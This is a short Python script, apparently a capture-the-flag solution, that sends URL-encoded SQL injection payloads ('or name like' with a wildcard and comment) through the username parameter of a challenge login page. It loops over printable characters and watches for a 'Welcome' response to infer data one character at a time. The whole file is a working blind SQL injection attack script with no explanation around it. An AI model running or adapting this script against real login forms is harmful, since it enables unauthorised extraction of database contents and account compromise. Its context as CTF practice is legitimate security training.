import requests
import string
url1="https://challenges.neverlanctf.com:1165/login.php?username="
url2="&password=fgh"
char= string.printable
a="3%27+or+name+like+%27"
b="%25%27%23"

for i in char:
    url=url1+a+i+b+url2
    print(url)
    r=requests.get(url)
    if "Welcome" in r.text:
        print ("[+]Find: "+i)
